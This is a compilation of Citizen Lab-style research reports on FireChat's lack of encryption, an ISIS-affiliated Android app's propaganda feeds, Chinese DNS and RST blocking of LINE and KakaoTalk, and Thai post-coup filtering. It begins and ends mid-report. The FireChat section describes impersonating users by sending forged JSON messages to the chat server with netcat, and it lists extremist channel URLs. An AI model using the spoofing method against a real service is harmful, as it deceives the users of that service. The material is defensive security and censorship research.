or Apple’s Multipeer Connectivity functions.  Finally, “FireChats” are Internet based chat rooms organized around a single theme word.\nWhen starting the application, the user is only prompted to enter a username.  After creating a username, the user can begin using the application.\nMessage transmission\nWhen sending a message in the “everyone” mode, the application begins by doing a DNS lookup of firechat.opengarden.com, which during our testing was hosted at the IP address 209.237.236.194 and is used by a server in California.  This is the only IP address that we were able to identify being used to send chat data.\nWhen sending a message through FireChat containing the string “Tcp” with the username “zigzeer”, the following traffic is sent to 209.237.236.194 unencrypted and in the clear:\nFigure 4: Sample of unencrypted traffic sent when sending a message in “everyone” mode.\n \nThe chat model of FireChat focuses on anonymity at the expense of confidentiality.  Throughout the application we see no encryption used, which makes the service inappropriate for sending sensitive communications. However, there is also very little information leaked that could de-anonymize users. For instance, the unique id (UUID) seen in Figure 4 above is unique to that specific message and is not tied to the sender. Instead, it is randomly generated at the time the message is sent, as seen in this decompiled source code:\nFigure 5: Decompiled source code that serializes the chat message JSON object above.\n \nSince no authentication takes place, anyone can read the messages, even from their browser by directly visiting the FireChat IP address on port 4175. As shown below, visiting this IP address in a browser displays the most recent messages sent on one of the “Everyone” public channels:\nFigure 6: Chat messages displayed when visiting FireChat server at 209.237.236.194:4175\n \nThe most interesting feature of the app is not the Internet-based chat rooms but the “Nearby” mode – the ability to chat peer-to-peer even when no network is present.  This communication is also not encrypted.  A Bluetooth packet capture of a sample illustrates a discussion between two users “Andrei” and “zigzeer”:\nFigure 7: Packet capture of communication in “nearby” mode\n \nUsers may or may not have an expectation that their communications are encrypted, as there is no user authentication and the service uses pseudonyms. However, it should be assumed that any message sent through the application can be read by anyone in the target range. This can occur whether or not you see other users in the “Nearby” channel, as the Bluetooth packets themselves are unencrypted. In addition, network operators (such as an ISP or mobile provider) can see both the message content and IP address, which can be tied to a user’s real name and subscriber information.\nSomething that is also not made clear in the app is the use of multicast UDP messages during “nearby” chat.  Multicast is a network mechanism that allows for one to many communications on IP networks.  If you are chatting with someone in the “Nearby” mode and your Wi-Fi is enabled the message you send via Bluetooth is also multicast, unencrypted, on the connected Wi-Fi.\n\nFigure 8: An example of a multicast UDP packet payload in a “Nearby” chat session with Wi-Fi turned on.\nIt is important to note that only sent messages are mirrored on Wi-Fi, while received messages are not. This would mean that if a user was connected to a public Wi-Fi network while using nearby chat to send a message, even if the message was sent using Bluetooth mode, the message would also be sent unencrypted on the Wi-Fi.  Therefore, users are advised to be aware of their Wi-Fi status if they wish to send local messages exclusively.\nData storage\nAll messages that are sent and received are stored unencrypted on the device in the folder:\n/data/data/com.opengarden.FireChat/cache/<CHANNEL_NAME>\nThis includes conversations in the “Everyone,” “FireChats” as well as the “Nearby” Bluetooth mode. This means that if someone’s phone is physically examined then all prior chats, including those made offline, are trivial to retrieve.\nFigure 9: A sample message from a “nearby” chat that is retained on the device.\n \nEach user has a unique user id and registration id, which are not sent with individual messages but are stored, unencrypted, on the device at:\n/data/data/com.opengarden.FireChat/shared_prefs/com.opengarden.FireChat_preferences.xml\nFurther, all channels that a user has joined are stored, unencrypted, on the device at:\n/data/data/com.opengarden.FireChat/shared_prefs/com.opengarden.FireChat.Application.JOINED_FIRECHATS.xml\nFigure 10: A sample of the joined_firechats file which stores channels a user has joined\n \nImpersonating users\nAs the application does not authenticate users, there is no attempt to restrict who uses which username. Impersonating other users on the service is trivially done as well by simply forming chat strings in the FireChat JSON format and sending it directly to the FireChat server via the netcat tool.  An example of such a string would be:\n{“name”:”zigzeer”,”FireChat”:”Everyone”,”uuid”:”55555555-5555-5555-5555-555555555555″,”msg”:”Hello World!”,”t”:1623.122977}\nAny individual can use this method to change their username and user id.  This means that you cannot guarantee that a user you messaged one day is the same person the next. This risk is inherent in any non-authenticated chat system such as FireChat.\nIraqi Surveillance Practices and Context\nThe issue of the use of insecure telecommunication tools in Iraq is particularly interesting because of reports that local agencies and foreign entities are monitoring telecommunications in the country. In June 2014, local Iraqi media quoted (Arabic) senior security officials as saying that surveillance on telecommunications in Iraq is being conducted by a special security committee that was established in 2013.\nThe Iraqi Minister of Telecommunications has warned (Arabic) in March 2011 that the telecommunications used by over 90 percent of government staff and officials are monitored by international entities, urging Iraqis not to communicate sensitive issues over the phone. The minister did not name the entities. However, Iraqi parliament members have explicitly accused Iran of monitoring telecommunications in Iraq.\nIn March 2012, an Iraqi parliament member has accused (Arabic) Iran of wiretapping the phones used by some members of the parliament in cooperation with one of the telecommunication companies working in Iraq. He did not name the company. He also demanded that all telecommunication companies operating in Iraq should pledge not to cooperate with any foreign state, adding that Iran can hack into the emails of parliament members and other individuals who oppose its influence in Iraq. Another Parliament Member said they have precise information that Iran has recruited 40 staffers to monitor the telephone lines and emails of 25 parliament members and politicians who oppose Iran’s intervention in Iraq.\nMoreover, a parliamentary committee revealed in 2012 that Chinese-made, inexpensive telecommunications equipment is widely available on the Iraqi market even though local laws criminalize possession of such equipment and punish those who bring them to the country with up to 10 years imprisonment.   Lastly, Iraqi communications are subject to intense surveillance by the United States’ National Security Agency, with some reports indicating that the aim of the NSA is to collect every Iraqi email, text message and phone-location signal in real time.\nThat a large and growing population of Iraqis is using an insecure chat application like FireChat in such a context of widespread and potentially aggressive surveillance practices is certainly noteworthy, and should be a cause for concern for anyone engaging in sensitive communications.\n\nPart 3: ISIS Android App\nWe also examined the ISIS-affiliated Android application, Dawn of Glad Tidings, which has been reported to use the Twitter accounts of those who install the app to spread ISIS-related messages. The app was removed from the Google Play Store on June 17, with a Google spokesperson stating “We remove any applications that breach our community guidelines”.\nOur research has found that the app does not, as reported, automatically connect to a user’s Twitter account to post tweets on your behalf.  Instead, the app has been built using AppYet, a web-based tool that allows for the creation of simple Android apps that display feeds of information from websites or RSS/Atom feeds. After a user specifies some basic details about which feeds to incorporate, an APK is emailed that can then be distributed and placed on the Google Play store. Users have the ability to share stories displayed from these feeds, but this sharing does not happen unless instigated by the user.\nOnce installed the app stores the RSS/Atom links in a SQLite database called data2.db located on the Android device in /data/data/com.pashaeer.myapp/databases/. The database contains six non-empty tables: android_metadata (stores locale), Module (stores name, groupname, icon), sqlite_sequence, Feed (lists the RSS links and web links for each module), FeedItem (individual feeds from source), and FileCache (cached images).\nInvestigating the application more closely permits examination of the specific feeds the application uses to display information to users. The following RSS/Atom links are displayed by the app, which are listed here alongside the associated name, web link and image:\n\n\n\nName\nRSS link\nWeb link\nAssociated image\n\n\nعبوة لاصقة\nhttp://gdata.youtube.com/feeds/api/users/UC0E80-y191XlvtBJMxDoebA/uploads?alt=rss&v=2&orderby=published&max-results=50\nhttp://www.youtube.com/channel/UC0E80-y191XlvtBJMxDoebA/videos\n\n\n\nالنصرة المقدسية\nhttp://gdata.youtube.com/feeds/api/users/UCGI36g6ClvwH3bshAS37XHQ/uploads?alt=rss&v=2&orderby=published&max-results=50\nhttp://www.youtube.com/channel/UCGI36g6ClvwH3bshAS37XHQ/videos\n\n\n\nالشيخ أبوعمر البغدادي\nhttp://gdata.youtube.com/feeds/api/users/UC_7lZ9yBRTynm7bnTjm0DrQ/uploads?alt=rss&v=2&orderby=published&max-results=50\nhttp://www.youtube.com/channel/UC_7lZ9yBRTynm7bnTjm0DrQ/videos\n\n\n\nأرشيف مؤسسة الإعتصام\nhttp://gdata.youtube.com/feeds/api/users/UC1j6YHUqXl-kk7YPYA3fUWA/uploads?alt=rss&v=2&orderby=published&max-results=50\nhttp://www.youtube.com/channel/UC1j6YHUqXl-kk7YPYA3fUWA/videos\n\n\n\nمؤسسة البتار الإعلامية\nhttp://daawla.tumblr.com/rss\nhttp://daawla.tumblr.com/\n\n\n\nوكالة الأنباء الإسلامية _حق\nhttp://www.dawaalhaq.com/?feed=rss2\nhttp://www.dawaalhaq.com\n\n\n\nشباب التوحيد\nhttp://chababtawhidmedia.blogspot.com/feeds/posts/default?alt=rss\nhttp://chababtawhidmedia.blogspot.com/\n\n\n\nبشائر اليوم\nhttp://gdata.youtube.com/feeds/api/users/UCKJHjixQfQaMkQzmgU8I_bg/uploads?alt=rss&v=2&orderby=published&max-results=50\nhttp://www.youtube.com/channel/UCKJHjixQfQaMkQzmgU8I_bg/videos\n\n\n\nمؤسسة الإعتصام 2\nhttp://gdata.youtube.com/feeds/api/users/e3tsemo/uploads?alt=rss&v=2&orderby=published&max-results=50\nhttp://www.youtube.com/user/e3tsemo/videos\n\n\n\nأخبار الدولة الإسلامية\nhttp://theshamnews.wordpress.com/feed/\nhttp://theshamnews.wordpress.com\n\n\n\nفجر البشائر\nhttp://el-pashaer.tumblr.com/rss\nhttp://el-pashaer.tumblr.com/\n\n\n\nمؤسسة الإعتصام\nhttp://gdata.youtube.com/feeds/api/users/UC92mC551Ro0iFAwwpHRVNIw/uploads?alt=rss&v=2&orderby=published&max-results=50\nhttp://www.youtube.com/channel/UC92mC551Ro0iFAwwpHRVNIw/videos\n\n\n\nترجمان الأساورتي\nhttp://gdata.youtube.com/feeds/api/users/UChxtUZfNoXbEeGqUDkC87Yw/uploads?alt=rss&v=2&orderby=published&max-results=50\nhttp://www.youtube.com/channel/UChxtUZfNoXbEeGqUDkC87Yw/videos\n\n\n\n\nWe included the URLs found in this application to our filtering test list described in Part 1, and none were found to be blocked.\nConclusion\nThe events since our last post on this subject show that access to information in Iraq remains highly contested.  As stable access to Internet content — and indeed the Internet itself — remains in flux, users are understandably seeking out alternative means of communication and access to information.  However, in such a chaotic context, poor choices can be made on the basis of incomplete information and users can end up putting themselves unintentionally at greater risk by hastily seeking to evade information controls.  The rising popularity of FireChat in Iraq is a case in point: the tool is functionally insecure, something even the developers have admitted, and yet users are flocking to it.  The Citizen Lab will continue to monitor the situation and post updates to our findings.\n\nData\nA full list of data from these tests can be found in our GitHub repository.\nAcknowledgements\nJakub Dalek, Adam Senft, Philipp Winter, and Andrei Dranka undertook research and writing of this report, supported by the Social Sciences and Humanities Research Council (Canada) Grant 430-2014-00183, Prof. Ronald J.

    "text": "\n\t\t\t\tDownload PDF version I Read on ISSUU\nMedia coverage: CBC News, TechPresident, and Slate.\nOn July 10 we reported that messaging applications LINE and KakaoTalk were being disrupted in China as a result of DNS tampering and HTTP request filtering. We also found that Flickr and Microsoft OneDrive were blocked in the country.\nSince that time we have done daily tests of these domains from servers in China. We find that Flickr and OneDrive remain consistently blocked, but LINE and KakaoTalk show inconsistent fluctuation between accessibility and inaccessibility.\nWe also analyze security and privacy issues in the mobile app FireChat and test accessibility of the service in China.\nAccessibility of KakaoTalk, Line, Flickr, OneDrive in China\nIn our previous post, we established that injected DNS replies was the primary mechanism by which KakaoTalk and LINE was being blocked in China.  We test the domains that we investigated in our previous post twice daily from July 12 – 23, 2014 to measure the consistency of the blocks.  We resolved the DNS records of the following domains in China:\n\n\n\nDomain Tested\nService\n\n\nflickr.com\nPhoto sharing service\n\n\nkakao.com\nKakaoTalk – Cross platform messaging app\n\n\nline.naver.jp\nLINE – Cross platform messaging app\n\n\nonedrive.live.com\nCloud file sharing service\n\n\n\nOur tests return known fake DNS replies that have been previously observed in China, as noted in a presentation from John-Paul Verkamp at the CAIDA Active Internet Measurements Workshop (see slide 6).\nThese possible fake response addresses are summarized below:\n\n\n\nIP\nNetwork\n\n\n8.7.198.45\nLEVEL3 – Level 3 Communications, Inc.,US\n\n\n78.16.49.15\nAS-BTIRE BT Communications Ireland Limited,IE\n\n\n37.61.54.158\nBAKINTER-AS Baktelekom,AZ\n\n\n93.46.8.89\nFASTWEB Fastweb SpA,IT\n\n\n46.82.174.68\nDTAG Deutsche Telekom AG,DE\n\n\n159.106.121.75\n\n\n\n59.24.3.173\nKIXS-AS-KR Korea Telecom,KR\n\n\n203.98.7.65\nCLIX-NZ TelstraClear Ltd,NZ\n\n\n243.185.187.39\n\n\n\n127.0.0.1\nLocalhost\n\n\n\nWe tested the domains to see whether or not they would return these known bad DNS responses.  We found that onedrive.live.com and flickr.com consistently returned false DNS replies, while kakao.com and line.naver.jp had sporadic fluctuations in the DNS reply given, occasionally giving a legitimate response.\nFigure 1 summarizes our results; a red block is a known false DNS reply and a green block is a correct DNS reply.\nFigure 1: Accessibility of domains from July 12 to 23 2014. Click to enlarge\nWe do not have an explanation for the inconsistent results we observe with Kakao and LINE. However, our findings are correlated with recent reports from Korean media that cite a diplomat in the South Korean Embassy in Beijing who explained  “The Chinese side tells us that the blockages will not last for a long time, and I expect services to return to normal by the end of this month”. The unnamed diplomat also noted that the Chinese government gave a “brief” reason for the blocking, but he could not share the information.\nSecurity and Privacy issues in FireChat\nWe also analyzed the mobile messaging application FireChat, which is advertised as enabling “off-the-grid” chatting, to users nearby, even without a mobile or wireless Internet connection. Using Bluetooth and Apple’s Multi peer Connectivity it claims to be able to connect users off-the-grid  who are up to 200 feet away.\nThis app recently saw a spike in download rates in Iraq, Taiwan, and elsewhere. Open Garden, the developer of FireChat appears particularly interested in growing Chinese speaking user bases, as evidenced by a recent update to their website that promotes the app in Chinese and provides link to Chinese app stores.  The Tencent App store currently reports  3.8 million downloads of the application.\nFigure 2: Screen shot of Open Garden website advertising FireChat in Chinese\nFireChat has three chat modes: “everyone”, a semi-global chat room where up to 80 individuals are sorted broadly based on their geographic location; “nearby”, mode that pairs users who are in close geographic proximity to each other using Wi-Fi, Bluetooth, or Apple’s Multipeer Connectivity functions; and “firechat”, Internet based chat rooms organized around a single theme word.\nThrough these features FireChat enables open broadcast communication channels. Given the nature of this functionality one would not necessarily expect robust security features. Indeed, our analysis shows that the application does not encrypt any communications, or user data stored on the device. Messages sent in any of the application’s three messaging modes are sent in the clear without encryption. All messages sent and received, as well as a list of chat channels the user has joined, are stored unencrypted on the device. It is also possible for anyone (regardless of whether they have installed the app or not) to visit an IP address associated with the service in a web browser to see the most recent messages sent by users of the application. Finally the application does not perform any user authentication, so a user cannot be certain who is using a given username at any given time.\nFull technical details on our analysis are available in a post here.\nIn media reports FireChat’s developers have acknowledged the potential security risks of using the application for sensitive communications:\n“People need to understand that this is not a tool to communicate anything that would put them in a harmful situation if it were to be discovered by somebody who’s hostile,” he said. “It was not meant for secure or private communications.”\nWhile the developers have been clear on this point in some media reports, the App store descriptions and developer’s website do not include similar warnings as of July 23.\nFireChat does not advertise itself as a secure communications tool, but that has not stopped it from being picked up by users in at risk environments such as Iraq. Given that security and privacy are not goals of the open broadcast channel implemented by FireChat, users should carefully assess if using FireChat is safe for their specific context and avoid sharing sensitive information through the service.\nAccessibility of FireChat in China\nWe ran tests to determine the accessibility of the FireChat service in China.  We tested the website of the developers (opengarden.com) as well as the site of the FireChat program (opengarden.com/firechat) and were able to retrieve the content in full from a network vantage point in Hangzhou, China.  The application is also available in a variety of Chinese app stores such as the one operated by Tencent.\nWe also tested the connection that the FireChat program uses in the “Everyone” mode of chatting.  We tried to initiate a connection to FireChat’s server IP address 209.237.236.194 on port 4175 from a server in Hangzhou and Beijing.  When we attempt this connection, we consistently receive spoofed RST segments, which is indicative of blocked content in China.\nFigure 3: TCP flow diagram of the connection to FireChat server showing an RST response\nThese results mean that while the website of the application developers is accessible, the chatroom functions of the app are blocked in our tests. However, blocking the connection to the FireChat server does not affect chat modes that rely on Bluetooth and Apple’s Multipeer Connectivity.\nConclusion\nWe will continue to monitor accessibility of LINE, KakaoTalk and other chat applications in China and post updates as they are available.\nData\nUpdated DNS and HTTP request data for Line, KakaoTalk, Flickr, and OneDrive domains on Github\nAcknowledgements\nJakub Dalek, Philipp Winter, Andrei Dranka, Masashi Crete-Nishihata, and Adam Senft undertook the research and writing of this post.

    "description": "Download PDF version I Read on ISSUU",
    "text": "\n\t\t\t\tDownload PDF version I Read on ISSUU\nFor coverage of the report, please see Tech in Asia.\nKey Findings \n\nSince July 2 2014, functionality of messaging applications LINE and KakaoTalk has been disrupted for users based in China as a result of DNS tampering and HTTP request filtering.\n\n\nOn July 3, LINE updated the keyword list used to trigger keyword filtering for users with accounts registered to Chinese phone numbers. However, the blocking of LINE domains in China breaks the update functionality for this new keyword list.\n\n\nPhoto-sharing platform Flickr and Microsoft’s cloud-storage service OneDrive have also been recently disrupted in China by DNS tampering.\n\nOverview\nOn July 2 2014, Tech in Asia reported that the official Web site (http://line.me) and instant messaging features of the LINE messaging application were inaccessible in mainland China. LINE Corporation acknowledged the service disruption in an announcement on its Weibo account, but did not provide details on why it was occurring. Interestingly, our monitoring of regionally-based keyword filtering in LINE for users with accounts registered to Chinese phone numbers found that the keyword list was updated on July 3 at approximately midnight EST.\nMessaging application KakaoTalk experienced a similar disruption in mainland China beginning around July 2. Kakao Corporation reported that China-based users of KakaoTalk were able to send instant messages through the app, but could not access other features such as the “item store” and adding new friends.\nThe disruption of these chat apps occurred at the same time of reports that photo sharing platform Flickr and Microsoft’s cloud-storage service OneDrive are also inaccessible in China. These service disruptions are correlated with mass democracy protests in Hong Kong on July 1 (a date that corresponds with the anniversary of the transfer of Hong Kong sovereignty from the United Kingdom to China). Some commentators have speculated that these outages may be an attempt by Chinese authorities to restrict information about the protests being transmitted through these applications and services.\nIn this post we examine how the Great Firewall of China (GFW) appears to be implementing DNS tampering and HTTP request filtering on KakaoTalk and LINE domains, which is disrupting service of the applications as a result. We find that Flickr and OneDrive are also blocked through DNS tampering.  We also analyze the latest changes to the LINE keyword filtering list.\nWhile there is clear technical evidence that these domains are blocked, it is unclear what the motivation behind blocking these platforms may be.\nDNS Tampering and TCP Reset Injection\nInspection of requests to LINE and KakaoTalk domains from a server based in Hangzhou, China reveal that the domains are blocked on the DNS and HTTP layers through DNS tampering and TCP Reset (RST) packet injection, respectively. Both of these filtering mechanisms are commonly used by the GFW.\nDNS tampering is a practice in which deep packet inspection boxes analyze DNS traffic and send spoofed DNS responses to the client upon detecting blocked queries.\nTCP RST packets are typically sent by clients or servers when there are network problems, as a response to a half-open connection, or some other network anomaly. When a RST flag is received most networking implementations in an operating system will shut down the socket used. One of the filtering mechanisms used by the GFW is inspection of HTTP traffic to check if there are any matches to keywords on block lists. If a match is present, forged TCP RST packets are injected into TCP flows which cause the endpoints to reset the connection.\nDNS Tampering and HTTP Filtering of LINE Domains\nThe messaging application LINE works by sending HTTP requests to Naver servers within the domain space line.naver.jp (Naver is the parent company of LINE Corporation). These requests are not unlike regular HTTP requests that a browser would send when visiting web sites.  All functions — from getting contact lists, changing account settings, sending messages, and visiting the in-app marketplace — are done through these HTTP requests.\nUnofficial documentation by Matti Virkkunen provides details on how the LINE communications protocol works. This document gives the following example of a public message containing an image that is served through a GET request to the URL:\nhttp://dl-obs.official.line.naver.jp/r/talk/o/u3ae3691f73c7a396fb6e5243a8718915-1379585871\nWhen this URL is requested from a server in Canada, an image of the Nintendo character Pikachu is returned:\nFigure 1. Content returned from http://dl-obs.official.line.naver.jp/r/talk/o/u3ae3691f73c7a396fb6e5243a8718915-1379585871 when accessed in Canada\nHowever, when we tested this URL from a server in Hangzhou, China on July 9, the request fails. If we use the HTTP client curl on this China-based server, we find that we cannot connect, because the GFW tampered with the DNS request for the domain line.naver.jp. This tampering causes the client to connect to the bogus IP address 37.61.54.158 which does not even run a web server.\n$ curl\n http://dl-obs.official.line.naver.jp/r/talk/o/u3ae3691f73c7a396fb6e5243a8718915-1379585871\ncurl: (7) couldn’t connect to host\nNote that if we lookup the IP of dl-obs.official.line.naver.jp on a non-Chinese network connection we get the Akamai IP 184.84.243.8. There seems to be no interference in sending packets directly to this IP from the Chinese connection as both ping and traceroutes are returned correctly. Therefore, the LINE domain is blocked, but the Akamai IP is accessible.\nSimilarly if we visit the in-app store of LINE on an Android phone to browse stickers, the application does a GET request to the URL: http://dl.stickershop.line.naver.jp/products/0/0/1/1109/android/preview.png\nThis request returns the following content in Canada:\nFigure 2: Content returned from http://dl.stickershop.line.naver.jp/products/0/0/1/1109/android/preview.png when accessed from Canada\nAgain this request fails in China:\n$ curl “http://dl.stickershop.line.naver.jp/products/0/0/1/1109/android/preview.png”\ncurl: (7) couldn’t connect to host\nThese results are not just limited to images. According to Virkkunen, personal chat and contact data is sent via the Apache Thrift protocol to the server gd2.line.naver.jp on port 443. In Canada these servers, without prior authentication, return a 404 response along with a distinct server response header named “X-LCR”:\n$ curl -I “https://gd2.line.naver.jp”\nHTTP/1.1 404 Object Not Found\nContent-Length: 9\nX-LCR: 110\nHowever, the same request will time out in China:\n$ curl -I “https://gd2.line.naver.jp”\ncurl: (28) SSL connection timeout\nAll of these failures are due to DNS tampering of LINE domains in China. In the table below we show the differing results for requests for LINE domains from our lab network in Canada and the Hangzhou-based network we tested on:\n\n\n\nDNS Response (IP and AS) in Canada for line.naver.jp\nDNS Response (IP and AS) in China for line.naver.jp\n\n\n119.235.235.44 – Line Corporation, Japan\n37.61.54.158 – Baktelekom, Azerbaijan\n\n\n\nThe incorrect response of the IP “37.61.54.158” we received in China has been seen in previous reports of other domains blocked in the country, such as facebook.com.\nFrom the China network vantage point we see that any lookup of gd2.line.naver.jp (where chat data is sent) and dl.stickershop.line.naver.jp (the in-app market place) return the same incorrect IP address.\n$ dig +short gd2.line.naver.jp\n37.61.54.158\n$ dig +short dl.stickershop.line.naver.jp\n37.61.54.158\nIndeed any subdomain of line.naver.jp, whether it exists or not returns the bogus IP address as a response:\n$ dig +short totallymadeup.domain.gojays.line.naver.jp\n37.61.54.158\nIn addition to this DNS tampering any HTTP GET request that contains “line.naver.jp” in the request header will have a TCP RST returned. Therefore, there is blocking at both the DNS and HTTP level.\n$ curl -H ‘Host: line.naver.jp’ x.x.x.x  (where x = any ip)\ncurl: (56) Recv failure: Connection reset by peer\nIn media reports of the recent LINE disruption, the official website of LINE (line.me) was also reportedly inaccessible. We tested line.me on the Hangzhou-based network on July 4 and found it was being blocked through forged TCP RST packets as seen in the TCP flow graph below:\nFigure 3 – TCP Flow graph of an injected RST response for line.me\n \nHowever, tests we ran on July 7 from this same server showed line.me to be accessible while access to the line.naver.jp domain remained blocked.  Additionally, there were also inconsistencies that were found in testing between different network vantage points in China. The testing that the findings of this report are based on was done on a server based in Hangzhou on which we consistently saw the network interference outlined. We also tested LINE domains on a commercial VPN provider based in Hefei (on Chinanet) and observed that there was no interference and the DNS requests resolved correctly in those cases. These results correspond to anecdotal reports that some users in China are able to use LINE normally while others cannot. At this time, the reason behind these inconsistencies is unknown.\nLINE Keyword List Update\nSince the fall of 2013, we have been analyzing regional-based keyword filtering  for LINE users with accounts registered to Chinese phone numbers. During our monitoring we have observed four updates to the keyword lists that the application retrieves from Naver servers. The list versions have been updated from v20, v21, v22, to the most recent update v23.\nOn June 3 at approximately midnight EST the keyword list was updated from v22 to v23. The only change to the list is the addition of a single keyword 买枪 “mǎi qiāng” (buy a gun). Keywords related to the purchase of illicit goods (including firearms) were prominently featured in keyword lists used to trigger censorship and surveillance features we previously discovered in the instant messaging program TOM-Skype. However, we have not found this content category in LINE keyword lists before.\nThis latest update is the smallest iteration to a LINE keyword list we have observed. In the previous change from list v21 to v22, 312 new keywords were added and 147 keywords were deleted.  Keyword list v23 retains the other 535 keywords present on v22 and only adds the single keyword to make the total size 536 keywords.\nAs we have  previously described, if a user is registered to a Chinese phone number, LINE will check for an updated keyword list over HTTP and HTTPS at the URLs http://line.naver.jp/app/resources/bwi and https://line.naver.jp/app/resources/bwraw. After the introduction of DNS tampering of domain names which include ‘line.naver.jp’, this mechanism for updating the keyword lists no longer functions.\nFigure 4 shows what happens when LINE attempts to update its keyword list from a connection in China.  The client initially tries to resolve line.naver.jp first but is redirected to the Azeri IP that does not host a web server.\nFigure 4 – Screenshot of a packet capture while attempting to update the LINE keyword list from a network in China\nA potential (but speculative) explanation for the unusual addition of a single keyword to list v23 is that LINE developers may be attempting to test if the update mechanism still functions following the service disruption. However, while the keyword list update was pushed approximately one day after the service disruption was reported, it is also possible the two events are unrelated.\nDNS Tampering and HTTP Filtering of LINE Domains\nThe KakaoTalk messaging application primarily operates through Web API calls to manage contact lists, read public messages, and adjust settings. Many of these calls rely on HTTP requests to kakao.com domains.\nFor example, retrieving your friends list requires the application to make a POST request to the kakao.com domain on the Android client: http://katalk.kakao.com/android/friends/update.json\nBlocking a user from contacting you requires the application to make a POST request to the URL: https://katalk.kakao.com/android/friends/block.json\nAccount registration on KakaoTalk takes place by sending an HTTP POST request to the URL: http://ac-talk.kakao.com/android/account/validate_phone_number.json\nSimilar to LINE, it appears that the kakao.com domain space is being tampered with by the GFW, which is resulting in disruptions to features in KakaoTalk.\nIn the table below we show the differing results for requests for kakao.com domains from our lab network in Canada and the Hangzhou-based network we tested on:\n\n\n\nDNS Response (IP and AS) in Canada for kakao.com\nDNS Response (IP and AS) in China forkakao.com\n\n\n110.76.141.122 – Kakao, Korea\n46.82.174.68 – Deutsche Telekom AG, Germany\n\n\n\nThe bogus IP address “46.82.174.68” returned in China has been previously reported as associated with DNS tampering in the country.\nIn addition to blocking on the DNS layer, the GFW blocks access to kakao.com on the HTTP layer by looking at the HTTP host header. Every HTTP request with a host header that contains the string “kakao.com” is blocked by injected TCP RST packets.\nFigure 5 – TCP Flow graph of an injected RST response for kakao.com\n \nWhere KakaoTalk differs from LINE is in its handling of private chat data. This data is sent via their custom LOCO communications protocol on a different port (5228) than other functions. Brian Pak has published documentation of this protocol and implementation in a series of blog posts (here and here). According to these posts, LOCO servers are identified by IP address and not by domain. This difference may explain reports that text messaging features were accessible in China, but other features such as adding friends, and accessing the “item store”, “notices”, and “plus friend” were inaccessible.\nDNS Tampering of Flickr and OneDrive\nIn addition to testing LINE and Kakao accessibility we tested the domains associated with the Flickr photo sharing service and Microsoft’s One Drive cloud storage service.  Similar to the disruptions of LINE and KakaoTalk we find that the domain responses of Flickr and One Drive have also been tampered with.\nFor example, the domain flickr.com responds again with the Azerbaijan IP we saw in the LINE domain tampering:\n$ dig +short flickr.com\n37.61.54.158\nWe see the same result when attempting to access the domain onedrive.live.com :\n$ dig +short onedrive.live.com\n37.61.54.158\nHowever, it is important to note that the top domain “live.com” returns the proper answer in China as it points to a Microsoft IP:\n$ dig +short live.com\n65.55.206.154\nThis result means that the live.com mail service is likely unaffected by the change but the cloud storage service is.\nConclusion\nThis recent incident is the first example of LINE and KakaoTalk domains being blocked in China of which we are aware. While the onset of the disruptions is correlated with the July 1 Hong Kong protests, this event is not necessarily the cause of the on-going outages. It is also curious that LINE, which has keyword filtering functionality of China-based users, and KakaoTalk which does not have these controls, are both being disrupted.\nThese disruptions are also occurring at the same time of sudden blocking of Flickr, One Drive, and more recently the removal of Instagram from Android App stores in China. Determining whether these recent disruptions and removals are related and what the underlying motivation behind them may be requires further research. We will continue to monitor the accessibility of these services and post updates as they become available.\nResources\n\nDNS and HTTP request data for Line, KakaoTalk, Flickr, and OneDrive domains on Github\n\n\nRaw and translated LINE keyword list data on Github\n\n\nLINE Region Code Encrypter Tool  for changing regions in the LINE client to disable regionally-based keyword censorship in the application\n\nAcknowledgements\nJakub Dalek, Philipp Winter, Andrei Dranka, Seth Hardy, Masashi Crete-Nishihata, and Adam Senft undertook the research and writing of this post.

    "text": "\n\t\t\t\tDownload PDF version I Read on ISSUU\nFor coverage of the report, see Global Voices Online and Netzpolitik [in German].\nBackground and Key Findings\nThe May 2014 coup d’etat in Thailand was the 19th coup attempt in the country’s history. It stands out from previous coups due to the military junta’s focus on information controls (defined below in more detail). It was also the first time that martial law was imposed before the coup, allowing the military to impose immediate restrictions on freedom of speech, association, and the press. In the 72 hours between the declaration of martial law and start of the coup, the military seized control over the media and restricted speech, both online and offline. By doing so, the military sought not only to silence opposing voices, but also attempt to neutralize a deeply-divided society.\nIn this report, we document the results of network measurements to determine how the Internet is being filtered and discuss other forms of information control implemented in the coup’s aftermath.\nFrom May 22 to June 26, 2014, we conducted network measurements of website accessibility in Thailand on a number of vantage points to confirm results, identify differences in how ISPs may apply filtering, and to identify centralized filtering infrastructure. We tested a sample of 433 URLs on the following Internet service providers (ISPs): 3BB, INET, and ServeNet (a data centre). We tested a smaller sample of 4 URLs on the ISPs CAT and TOT.\nThe results identify a total of 56 URLs blocked in the country. The content found blocked includes political content such as domestic independent news media and international media coverage that are critical of the coup, social media accounts sharing anti-coup material, as well as circumvention tools, gambling websites and pornography.\nResults of these network tests reveal that blocking in the days following the coup was highly dynamic. The earliest test results did not show any evidence of blocking, but after the first websites were found blocked subsequent test results showed new websites being blocked on a daily basis. The technical methods used to implement blocking were also dynamic, as the blockpages displayed and services used to host them also changed regularly. Tests on 3BB showed three distinct blockpages that appear to be related to the content types being blocked. We also observed different types of content being filtered by the different ISPs tested.Combined, these changes reflect a volatile environment in which the implementation of Internet filtering has shifted rapidly as the coup develops.\nThe changes in filtering we observed following the coup are happening alongside a series of other measures aimed at monitoring and controlling information in Thailand.  For example, the junta created new administrative bodies to monitor and control online content, introduced surveillance of mobile messaging applications, targeted and arrested activists and former government officials based on their social media activities, summoned academics and journalists for questioning, and introduced an application to harvest users’ Facebook credentials. We have seen similar efforts in the past when, following the 2006 military coup, a series of new legislative measures were introduced to control online content. As we will outline below, the events following the 2014 coup indicate that the military junta once again intends to restrict and control the spread of information.\nPolitical Context in Thailand\nThailand has been embroiled in a protracted political conflict since 2005, during the government of the highly popular, but polarizing, former Prime Minister Thaksin Shinawatra. Thaksin was often criticized by the largely conservative middle class Thais, loosely organized as the “Yellow Shirts,” who saw him as a threat to the monarchy and were critical of what they allege to be cronyism and corruption practiced by Thaksin and his inner circle. After a series of anti-government rallies, Thaksin was removed from power in a military coup in 2006. Despite this, his loyal supporters, mobilized collectively as the “Red Shirts” movement, continued to vote in Thaksin-aligned political parties, including the most recent majority government of the Pheu Thai party, under the leadership of his sister, Yingluck Shinawatra. Thaksin supporters are primarily rural residents who were swayed by policies he introduced that benefited them such as health care and education funding. As a result, color-coded protests and political violence have characterized the Thai political scene for over a decade.\nThe current political crisis in Thailand has been developing since October 2013, when the Yingluck government sought to pass amnesty bills seen as crucial to the roadmap towards national reconciliation. However these bills were perceived as a ploy to allow 